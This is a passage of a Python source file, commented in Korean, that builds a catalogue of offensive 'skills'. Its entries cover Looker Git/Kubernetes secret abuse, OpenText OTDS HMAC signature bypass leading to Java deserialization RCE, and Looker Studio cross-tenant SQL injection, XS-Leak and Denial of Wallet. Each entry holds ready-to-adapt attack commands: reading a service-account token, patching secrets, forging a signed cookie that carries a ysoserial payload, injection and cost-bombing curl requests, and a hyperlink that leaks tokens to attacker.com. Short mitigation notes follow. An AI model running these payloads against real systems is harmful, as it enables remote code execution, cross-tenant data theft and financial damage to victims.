        "# -H 'Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)'",
        "# 5) K8s secrets 업데이트로 타 인스턴스 접근",
        "# kubectl patch secret TARGET_SECRET -n looker --type='json' -p='[{\"op\":\"replace\",\"path\":\"/data/password\",\"value\":\"BASE64_PAYLOAD\"}]'",
    ],
    "notes": (
        "[완화] dir_path_array 입력 시 루트('/')·빈 경로 명시적 거부. "
        "Git 훅 실행 비활성화 (core.hooksPath=/dev/null). "
        "파일 삭제 전 .git 존재 여부 재검증. "
        "K8s 서비스 계정 최소 권한 원칙 (secrets update 권한 불필요 시 제거). "
        "[레퍼런스] "
        "flatt.tech — Remote Command Execution in Google Cloud with Single Directory Deletion (2026), "
        "Google Cloud VRP bugSWAT — Looker Git Integration RCE, "
        "Git Documentation — fsmonitor hook"
    ),
},

"sec-web-hmac-bypass-deser": {
    "name": "HMAC IV 구조 오류 서명 우회 → Java ObjectInputStream 역직렬화 RCE",
    "module": "SecSkills-Web",
    "tags": ["hmac", "signature-bypass", "broken-crypto", "java-deserialization",
             "objectinputstream", "cookie", "rce", "opentext", "otds", "ysoserial"],
    "desc": (
        "OpenText Directory Services(OTDS) 쿠키 처리에서 발견된 HMAC 서명 우회 → 역직렬화 RCE. "
        "취약점: getByteArrayFromSignedArray()에서 HMAC 계산 시 mac.update(iv) 후 mac.doFinal(message) 실행 "
        "→ IV와 message가 분리된 구조에서 IV 값을 임의로 설정해 동일한 HMAC 서명 생성 가능. "
        "splitByteArray()의 Length-Prefixed 포맷을 악용해 IV·message 경계 조작. "
        "결과: 서명 검증 통과 → ObjectInputStream.readObject() 호출 → ysoserial 페이로드로 RCE. "
        "인증 없이(쿠키 조작만으로) 익스플로잇 가능."
    ),
    "tools": ["python3", "ysoserial", "burpsuite", "java", "curl"],
    "commands": [
        "# 1) 취약 엔드포인트 탐지 (쿠키 기반 역직렬화)",
        "curl -s -I https://TARGET/otdsws/ | grep -i 'set-cookie'",
        "# cookieToMap 호출 추적: OTDSESSION 등 쿠키 확인",
        "# 2) HMAC IV 구조 분석",
        "python3 -c \""
        "import struct, base64; "
        "# 취약한 splitByteArray 포맷: [2B len][sig][2B len][iv][2B len][message]"
        "def build_payload(signature, iv, message):"
        "    return (struct.pack('>H', len(signature)) + signature +"
        "            struct.pack('>H', len(iv)) + iv +"
        "            struct.pack('>H', len(message)) + message);"
        "# HMAC 계산: mac.update(iv); mac.doFinal(message)"
        "# → iv와 message를 조작해 동일 signature 생성 가능"
        "import hmac, hashlib; "
        "key = b'\\x00' * 16; "
        "iv = b'A' * 16; "
        "message = b'PLACEHOLDER_PAYLOAD'; "
        "mac = hmac.new(key, iv + message, hashlib.sha1).digest(); "
        "print('HMAC:', mac.hex())\"",
        "# 3) ysoserial 역직렬화 페이로드 생성",
        "# java -jar ysoserial.jar CommonsCollections6 'id > /tmp/rce.txt' > /tmp/payload.ser",
        "python3 -c \""
        "import subprocess; "
        "result = subprocess.run("
        "    ['java', '-jar', 'ysoserial.jar', 'CommonsCollections6', 'id'],"
        "    capture_output=True"
        "); "
        "print('Payload size:', len(result.stdout), 'bytes')\"",
        "# 4) HMAC 우회 + 역직렬화 페이로드 쿠키 생성",
        "python3 -c \""
        "import hmac, hashlib, struct, base64, zlib; "
        "key = b'TARGET_SECRET_KEY'; "
        "ysoserial_payload = open('/tmp/payload.ser', 'rb').read(); "
        "compressed = zlib.compress(ysoserial_payload); "
        "iv = b'\\x00' * 16; "
        "mac = hmac.new(key, iv, hashlib.sha1); "
        "mac.update(compressed); "
        "signature = mac.digest(); "
        "cookie_bytes = ("
        "    struct.pack('>H', len(signature)) + signature +"
        "    struct.pack('>H', len(iv)) + iv +"
        "    struct.pack('>H', len(compressed)) + compressed"
        "); "
        "cookie_b64 = base64.b64encode(cookie_bytes).decode(); "
        "print(f'Cookie: OTDSESSION={cookie_b64}')\"",
        "# 5) 쿠키로 RCE 트리거",
        "# curl -s https://TARGET/otdsws/ -H 'Cookie: OTDSESSION=PAYLOAD_B64'",
    ],
    "notes": (
        "[완화] HMAC 계산 시 IV를 메시지에 포함하거나 별도 검증하지 말 것 (IV 분리 구조 폐기). "
        "Mac.update() 호출 순서 및 범위 명확히 정의. "
        "역직렬화 시 ObjectInputStream 대신 안전한 직렬화 라이브러리 사용. "
        "deserialization 필터 적용 (Java 9+ ObjectInputFilter). "
        "[레퍼런스] "
        "slcyber.io — Almost Impossible: Java Deserialization Through Broken Crypto in OpenText Directory Services (2026), "
        "ysoserial — Java Deserialization Gadget Chains"
    ),
},

"sec-cloud-bi-cross-tenant-sqli": {
    "name": "Cloud BI 플랫폼 크로스 테넌트 SQL Injection (0-click/1-click) + XS-Leak + Denial of Wallet",
    "module": "SecSkills-Cloud",
    "tags": ["looker-studio", "google-cloud", "bigquery", "cross-tenant", "sql-injection",
             "0-click", "1-click", "xs-leak", "denial-of-wallet", "bi-platform", "leakylooker"],
    "desc": (
        "Tenable LeakyLooker 연구 기반 Cloud BI 플랫폼(Google Looker Studio) 크로스 테넌트 취약점 9개. "
        "Owner 자격증명 모델(0-click): 공격자가 보고서에 악의적 SQL 쿼리 주입 "
        "→ 서버 측에서 피해자 Owner 토큰으로 BigQuery/Spanner/DB 실행 "
        "→ 피해자 전체 데이터셋 탈취(클릭 불필요). "
        "Viewer 자격증명 모델(1-click): 악의적 링크 클릭 시 피해자 권한으로 SQL 실행. "
        "XS-Leak: frame counting·timing oracle로 다른 테넌트 데이터 추론. "
        "Denial of Wallet: BigQuery 대용량 쿼리 강제 실행으로 피해자 비용 폭탄. "
        "하이퍼링크/이미지 렌더링으로 자격증명 탈취."
    ),
    "tools": ["burpsuite", "curl", "python3", "google-cloud-sdk"],
    "commands": [
        "# 1) Looker Studio 보고서 API 탐지",
        "curl -s 'https://lookerstudio.google.com/api/ds/v1/datasources' "
        "-H 'Authorization: Bearer YOUR_TOKEN' | python3 -m json.tool | head -40",
        "# 2) 0-click SQL Injection — Owner 자격증명 악용 (bash+curl)",
        "curl -sk -m 10 -X POST 'https://lookerstudio.google.com/api/ds/v1/query' "
        "-H 'Authorization: Bearer YOUR_TOKEN' -H 'Content-Type: application/json' "
        "-d '{\"datasourceId\":\"VICTIM_DATASOURCE_ID\",\"fields\":[{\"id\":\"qt_test\","
        "\"name\":\"qt_test' UNION SELECT session_user()--\",\"type\":\"TEXT\"}]}' "
        "| python3 -c \"import sys; print('SQL Injection result:', sys.stdin.read()[:500])\"",
        "# 3) BigQuery Denial of Wallet 공격 (bash+curl)",
        "curl -sk -m 30 -X POST 'https://lookerstudio.google.com/api/ds/v1/query' "
        "-H 'Authorization: Bearer YOUR_TOKEN' -H 'Content-Type: application/json' "
        "-d '{\"datasourceId\":\"VICTIM_DATASOURCE_ID\","
        "\"query\":\"SELECT * FROM bigquery-public-data.github_repos.contents CROSS JOIN UNNEST(GENERATE_ARRAY(1,10000))\"}' "
        "-o /dev/null -w 'Denial of Wallet triggered: %{http_code}\\n'",
        "# 4) XS-Leak — Frame Counting Oracle",
        "python3 -c \""
        "# iframe frame count로 응답 크기 추론 → 데이터 유출"
        "js_payload = '''<script>"
        "function leak(url) {"
        "    var w = window.open(url);"
        "    setTimeout(() => {"
        "        try { console.log('Frames:', w.length); } catch(e) {}"
        "    }, 2000);"
        "}"
        "leak('https://lookerstudio.google.com/reporting/VICTIM_REPORT_ID');"
        "</script>'''; "
        "print('XS-Leak JS payload ready')\"",
        "# 5) 공개 보고서에서 Owner 자격증명 데이터 접근",
        "curl -s 'https://lookerstudio.google.com/reporting/SHARED_REPORT_ID/data' "
        "-H 'Authorization: Bearer ATTACKER_TOKEN'",
        "# 6) Hyperlink Injection — 자격증명 탈취",
        "# 보고서 필드에 <a href='https://attacker.com/?token=__USER_TOKEN__'>Click</a> 주입",
    ],
    "notes": (
        "[완화] BI 플랫폼에서 사용자 입력을 SQL alias/쿼리에 직접 삽입 금지. "
        "Owner 자격증명 모델에서 쿼리 필드 엄격한 검증. "
        "BigQuery 쿼리 비용 한도 설정 (maximum bytes billed). "
        "X-Frame-Options: DENY로 XS-Leak 완화. "
        "공유 보고서에 Origin 검증 추가. "
        "[레퍼런스] "
        "Tenable Research — LeakyLooker: Google Cloud Looker Studio Vulnerabilities (TRA-2025-27~41), "
        "Google Cloud — Looker Studio Security Advisory, "
        "portswigger.net — Cross-Site Leaks (XS-Leaks)"
    ),
},

}

# 인덱스 생성
MODULE_INDEX_3: dict[str, list[str]] = {}
TAG_INDEX_3: dict[str, list[str]] = {}

for skill_id, skill in SKILLS_DB_3.items():
    mod = skill["module"]
    if mod not in MODULE_INDEX_3:
        MODULE_INDEX_3[mod] = []
    MODULE_INDEX_3[mod].append(skill_id)

    for tag in skill.get("tags", []):
        if tag not in TAG_INDEX_3:
            TAG_INDEX_3[tag] = []
        TAG_INDEX_3[tag].append(skill_id)
